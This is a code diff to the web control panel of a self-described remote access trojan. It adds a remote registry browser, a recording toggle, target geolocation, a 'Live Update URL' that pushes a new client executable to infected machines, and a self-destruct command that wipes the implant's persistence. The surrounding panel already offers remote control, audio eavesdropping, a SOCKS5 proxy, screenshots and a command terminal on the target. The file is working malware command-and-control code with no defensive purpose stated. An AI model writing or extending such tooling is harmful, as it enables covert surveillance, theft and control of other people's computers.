@@ -662,6 +662,9 @@
                 <button class="tab-btn" data-tab="map" onclick="switchTab(event, 'map')">
                     <span class="tab-icon">📍</span> Map
                 </button>
+                <button class="tab-btn" data-tab="reg" onclick="switchTab(event, 'reg')">
+                    <span class="tab-icon">🗄️</span> Registry
+                </button>
             </div>
 
             <!-- LIVE VIEW -->
@@ -696,6 +699,7 @@
                     <button class="action-btn" id="btn-control" onclick="toggleControl()">🎮 Enable Control</button>
                     <button class="action-btn" id="btn-fullscreen" onclick="toggleFullscreen()">🔲 Fullscreen</button>
                     <button class="action-btn" id="btn-audio" onclick="toggleStream('audio')">🎤 Listen Audio</button>
+                    <button class="action-btn" id="btn-record" onclick="toggleStream('record')" style="background: rgba(255, 71, 87, 0.2); border-color: #ff4757;">🔴 Start Recording</button>
                     <button class="action-btn" id="btn-socks" onclick="toggleStream('socks5')">🔗 Start SOCKS5</button>
                     <button class="action-btn" onclick="takeScreenshot()">📸 Screenshot</button>
                     <button class="action-btn" onclick="sysInfo()">ℹ️ System Info</button>
@@ -724,6 +728,30 @@
                         <div class="terminal-prompt">❯</div>
                         <input type="text" class="terminal-input" id="cmd-input" placeholder="Enter command..." onkeydown="if(event.key==='Enter')executeCmd()">
                         <button class="terminal-send" onclick="executeCmd()">RUN ▶</button>
+                    </div>
+                    <div class="terminal-footer">
+                        <button class="action-btn" onclick="clearTerminal()">🗑️ Clear</button>
+                    </div>
+                </div>
+
+                <!-- ELITE MAINTENANCE SECTION -->
+                <div class="terminal-container" style="margin-top: 1.5rem; border-color: rgba(255, 71, 87, 0.3);">
+                    <div class="terminal-header" style="background: rgba(255, 71, 87, 0.1);">
+                        <h4 style="color: #ff4757;">⚙️ Elite Maintenance</h4>
+                    </div>
+                    <div style="padding: 1.5rem; display: flex; flex-wrap: wrap; gap: 1rem; align-items: center;">
+                        <div style="flex: 1; min-width: 250px;">
+                            <label style="display: block; font-size: 0.7rem; color: var(--text-muted); margin-bottom: 0.3rem;">Live Update URL</label>
+                            <div style="display: flex; gap: 0.5rem;">
+                                <input type="text" id="update-url" class="action-btn" style="flex: 1; text-align: left;" placeholder="https://your-site.com/new_client.exe">
+                                <button class="action-btn" onclick="updateRat()" style="border-color: var(--accent);">Update RAT</button>
+                            </div>
+                        </div>
+                        <div style="border-left: 1px solid var(--border); height: 40px; margin: 0 1rem;" class="hide-mobile"></div>
+                        <button class="action-btn" onclick="selfDestruct()" style="background: #ff4757; color: white; border: none; padding: 0.8rem 1.5rem;">💣 Self-Destruct</button>
+                        <p style="width: 100%; font-size: 0.7rem; color: var(--text-muted); margin-top: 0.5rem;">
+                            ⚠️ <b>Self-Destruct</b> will wipe all persistence and delete the client from the target machine permanently.
+                        </p>
                     </div>
                 </div>
             </div>
@@ -785,19 +813,55 @@
 
             <!-- MAP / GEO-IP -->
             <div id="map" class="tab-content">
-                <div class="stream-grid">
-                    <div class="stream-box" style="grid-column: span 2;">
-                        <div class="stream-header">
-                            <h4>🌍 Target Location Tracking</h4>
-                            <button class="action-btn" style="padding: 0.3rem 0.8rem; font-size: 0.7rem;" onclick="fetchLocation()">Update Location</button>
+                <div class="terminal-container">
+                    <div class="terminal-header" style="justify-content: space-between;">
+                        <h4>🌍 Target Location Tracking</h4>
+                        <button class="action-btn" onclick="fetchLocation()">Update Location</button>
+                    </div>
+                    <div style="padding: 2rem; display: flex; align-items: center; gap: 2rem;">
+                        <div id="map-pin" style="font-size: 3rem; filter: drop-shadow(0 0 10px rgba(255, 71, 87, 0.5));">📍</div>
+                        <div>
+                            <h2 id="loc-city-country" style="margin: 0; color: var(--accent);">Localhost, Internal</h2>
+                            <p id="loc-details" style="color: var(--text-muted); margin-top: 0.5rem; line-height: 1.6;">
+                                IP Address: <b>N/A</b><br>
+                                ISP: <b>N/A</b><br>
+                                Lat/Lon: <b>0, 0</b><br>
+                                Timezone: <b>N/A</b>
+                            </p>
                         </div>
-                        <div id="location-info" style="padding: 2rem; display: flex; gap: 2rem; align-items: center;">
-                            <div style="font-size: 3rem;">📍</div>
-                            <div>
-                                <h1 id="loc-city-country" style="margin-bottom: 0.5rem; color: var(--accent);">Waiting for data...</h1>
-                                <p id="loc-details" style="color: var(--text-muted); line-height: 1.6;"></p>
-                            </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REGISTRY BROWSER -->
+            <div id="reg" class="tab-content">
+                <div class="terminal-container">
+                    <div class="terminal-header">
+                        <h4>🗄️ Remote Registry Explorer</h4>
+                        <div style="display: flex; gap: 0.5rem;">
+                            <select id="reg-root" class="action-btn" style="padding: 0.2rem; background: var(--bg-card);">
+                                <option value="HKCU">HKCU</option>
+                                <option value="HKLM">HKLM</option>
+                                <option value="HKCR">HKCR</option>
+                                <option value="HKU">HKU</option>
+                            </select>
+                            <input type="text" id="reg-path" class="action-btn" placeholder="Path\\To\\Key" style="flex: 1; text-align: left; padding: 0.3rem;" value="Software\\Microsoft\\Windows\\CurrentVersion">
+                            <button class="action-btn" onclick="getRegistry()">Browse</button>
                         </div>
+                    </div>
+                    <div style="padding: 1rem; overflow-x: auto;">
+                        <table style="width: 100%; border-collapse: collapse; font-size: 0.85rem;">
+                            <thead>
+                                <tr style="border-bottom: 1px solid var(--border); color: var(--text-muted); text-align: left;">
+                                    <th style="padding: 0.5rem;">Name</th>
+                                    <th style="padding: 0.5rem;">Type</th>
+                                    <th style="padding: 0.5rem;">Value</th>
+                                </tr>
+                            </thead>
+                            <tbody id="reg-list-body">
+                                <tr><td colspan="3" style="text-align:center; padding: 2rem; color: var(--text-muted);">Select root/path and click Browse</td></tr>
+                            </tbody>
+                        </table>
                     </div>
                 </div>
             </div>
@@ -950,6 +1014,18 @@
         socket.on('process_list', (data) => {
             if (selectedClient && data.client_id === selectedClient) {
                 renderProcesses(data.processes);
+            }
+        });
+
+        socket.on('registry_list', (data) => {
+            if (selectedClient && data.client_id === selectedClient) {
+                renderRegistry(data.items, data.path, data.root);
+            }
+        });
+
+        socket.on('file_list', (data) => {
+            if (selectedClient && data.client_id === selectedClient) {
+                renderFiles(data.files, data.path);
             }
         });
 
@@ -1189,6 +1265,59 @@
                     `;
                     showToast('Location updated', 'success');
                 });
+        }
+
+        /* ===== PHASE 4 REGISTRY ===== */
+        function getRegistry() {
+            if (!requireClient()) return;
+            const root = document.getElementById('reg-root').value;
+            const path = document.getElementById('reg-path').value;
+            socket.emit('get_registry', { client_id: selectedClient, root: root, path: path });
+            showToast(`Browsing ${root}\\${path}`, 'info');
+        }
+
+        function renderRegistry(items, path, root) {
+            const body = document.getElementById('reg-list-body');
+            body.innerHTML = '';
+            
+            items.forEach(item => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid rgba(255,255,255,0.03)';
+                const icon = item.type === 'key' ? '📁' : '📄';
+                tr.innerHTML = `
+                    <td style="padding: 0.6rem; font-weight: 500;">${icon} ${item.name}</td>
+                    <td style="padding: 0.6rem; color: var(--text-muted);">${item.type}</td>
+                    <td style="padding: 0.6rem; color: var(--accent); max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${item.value || '-'}</td>
+                `;
+                if (item.type === 'key') {
+                    tr.style.cursor = 'pointer';
+                    tr.onclick = () => {
+                        const newPath = path + '\\' + item.name;
+                        document.getElementById('reg-path').value = newPath;
+                        socket.emit('get_registry', { client_id: selectedClient, root: root, path: newPath });
+                    };
+                }
+                body.appendChild(tr);
+            });
+        }
+
+        /* ===== PHASE 4 MAINTENANCE ===== */
+        function selfDestruct() {
+            if (!requireClient()) return;
+            if (confirm("⚠️ WARNING: This will PERMANENTLY remove the RAT from the target machine. Are you sure?")) {
+                socket.emit('self_destruct', { client_id: selectedClient });
+                showToast('Self-destruct command sent!', 'error');
+            }
+        }
+
+        function updateRat() {
+            if (!requireClient()) return;
+            const url = document.getElementById('update-url').value.trim();
+            if (!url) return showToast('Please enter a valid update URL', 'warning');
+            if (confirm(`Update client from ${url}?`)) {
+                socket.emit('update_rat', { client_id: selectedClient, url: url });
+                showToast('Update command sent!', 'info');
+            }
         }
 
         /* ===== PERIODIC REFRESH ===== */
